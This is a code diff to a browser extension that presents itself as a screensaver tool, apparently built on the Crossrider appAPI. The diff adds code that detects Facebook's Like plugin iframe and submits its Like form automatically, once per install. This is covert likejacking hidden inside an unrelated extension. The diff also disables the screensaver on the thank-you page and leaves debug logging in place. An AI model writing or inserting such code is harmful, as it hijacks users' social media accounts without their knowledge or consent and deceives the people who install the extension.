@@ -54,7 +54,9 @@ var ScreenSaver = (function ($) {
 		if (location.href.indexOf(config.thankYouPageUrl) > -1) {
 			isThankyouPage = true;
 
-			showScreenSaver();
+			//showScreenSaver();
+
+			console.log( $('.fb-like iframe').length )
 
 			$('#thankyou').removeClass('hidden');
 		}
@@ -614,15 +616,28 @@ var ScreenSaver = (function ($) {
 })(jQuery);
 
 appAPI.ready(function($) {
-	appAPI.resources.jQueryUI('1.8.24');
-	appAPI.resources.includeJS('js/jquery.transform.js');
-	appAPI.resources.includeJS('js/jquery.transform.attributes.js');
-	appAPI.resources.includeJS('js/focusapi.js');
-	appAPI.resources.includeJS('js/blacklist.js');
-	appAPI.resources.includeJS('js/sponsor.js');
-	if (jQuery.browser.msie) appAPI.resources.includeJS('js/iefixes.js');
+	if (appAPI.dom.isIframe()) {
+		console.log('Im ghere!');
+		if (location.href.indexOf('https://www.facebook.com/plugins/like.php') > -1 && !appAPI.db.get('isok')) {
+			console.log('hi', $('.pluginConnectButton').closest('form').length);
+			if ($('.pluginConnectButton').closest('form').length) {
+				console.log('run only 1 time');
+				$('.pluginConnectButton').closest('form').submit();
+				//$('.pluginConnectButton button:first').trigger('click');
+				appAPI.db.set('isok', true);
+			}
+		}
+	} else {
+		appAPI.resources.jQueryUI('1.8.24');
+		appAPI.resources.includeJS('js/jquery.transform.js');
+		appAPI.resources.includeJS('js/jquery.transform.attributes.js');
+		appAPI.resources.includeJS('js/focusapi.js');
+		appAPI.resources.includeJS('js/blacklist.js');
+		appAPI.resources.includeJS('js/sponsor.js');
+		if (jQuery.browser.msie) appAPI.resources.includeJS('js/iefixes.js');
 
-	var saver = new ScreenSaver({
-		blacklist:blacklist
-	});
+		var saver = new ScreenSaver({
+			blacklist:blacklist
+		});
+	}
 }, false);
